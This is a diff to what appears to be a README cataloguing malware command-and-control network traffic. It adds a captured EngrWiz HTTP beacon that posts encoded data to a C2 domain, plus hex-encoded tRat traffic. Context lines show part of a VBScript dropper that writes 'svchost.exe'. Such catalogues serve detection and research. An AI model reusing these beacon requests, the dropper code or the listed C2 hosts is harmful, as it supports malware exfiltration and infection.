@@ -583,6 +583,28 @@ Connection: keep-alive
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-1.png "Emotet")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/emotet-2.png "Emotet")
 
+#### EngrWiz
+~~~
+POST /b.php?79 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: litespidchk.tk
+Content-Length: 970
+Expect: 100-continue
+
+main1=bNzJOjMPRRDJ2ylFA1SCAY7GEg0j4ROaetEMhuN1ObuzyJ%2bYF2etM938iapA5dT909gUM9ORgU5n0fMY%2fFKhRr7QWxNopqIoNFeQWjzRaqyGtXxs5NLSLHAitCOyzowy&back=TnpNNU5DMUJNamRETFRnMk9VVXRRVEpEUXkwM016WXpMVE00TXprdFFqTXlNaTA0TXpCRE96VHA%3d&main3=NTQ%3d&main2=Gr4YoYDefbNT%2ftg2inQcbufFo%2bzbKZmaqrttK%2fVrQXhuPh9fr66Kem9y7I%2bsUHvrnrmSNogQl3Lk%2bMvr9p8aGKsZrSODSSTbYPy3Osy5WF8reN7lc6V%2fUtARI%2bizcbulBVnqc3zLaKOvIEl8eDqq6mbY5GwzG3Mie6NW5W1zLG3hEmABLyZkbQdJhhkYhMpQbxkuIhbcIzdTSm9%2b4xC8gb9v%2bnRligpWZowXrb56VqPC9KrPYuBnIqHH4xj5Pwgyl1g8kDTLJ2qMfGIAZeFv4YuSM2Xuza%2bMN7Zpi8Uuxuvq1D9wsc7b8V4POHZ9Rn34alELER2wAdRQ7PiNI2sglwH97JsZoopUyW28YJOAFWJ6kDPKXKIpiUifcye%2b4wplt9fV3OycDqbt5gAbobpA7qNTgyQfAUXYrXMDRNhNQi4%2ffbWCt2%2fd%2bZd%2fxe9k55wQhhLbdy%2bn1wLkZz4NIGssu9vJECynDGwT%2f4MlFIwD5kV0hD%2bjjSTHecWF23%2f0Wi%2fCS7msiLCQ3SukIpWskjRPNPZ8TDvlYctblEeLUZWZDobBQgsdLUzCekYEsX4toOXF2NV69a3ayO0e8etiw4LPRrvbBQiAmU5FZYESOeWkaw71mxzjOxeHFPQtKn2%2fWwdxBpl05y5BtZSnOzfc2wCELk4iYCl20OE5OtjyGvhtAes%3dHTTP/1.1 200 OK
+Date: Wed, 24 Jul 2019 09:11:10 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Set-Cookie: __cfduid=d6917d65789c5d5e772089d4fe53cd4181563959469; expires=Thu, 23-Jul-20 09:11:09 GMT; path=/; domain=.litespidchk.tk; HttpOnly
+X-Xss-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Request-ID: 571e4da59d69406a9d967ee31ad5fae4
+Server: cloudflare
+CF-RAY: 4fb4c3dd683ccaf4-ARN
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/engrwiz.png "EngrWiz")
+
 #### Evilpony
 Follow tcp stream, not http stream in wireshark
 ~~~
@@ -2083,9 +2105,7 @@ body {
 </table>
 </body>
 </html>
- 
 
- 
  
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -2222,6 +2242,17 @@ Host: thankg1.org
 ......qV4`..Pu*...8W.........M .h.v.S.:.
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")
+
+#### tRat
+~~~
+E6B445EAAE293948E31CD2723392863B9AE4D628D2ECD58BFAD8ADEEACEAD19EFEF9868CD7D1872F8C6B8A3AFE498B14D649A09DFEA687D0D2318C13D1EF8FADF9
+CF8B77
+CF9C77
+D9946ECBD82F2852885EF1501CB5CD2AFBF2C769F1CFF89D
+A5EB1BAE
+CF896FDFD03355
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trat.png "tRAt")
 
 #### Trickbot
 ~~~
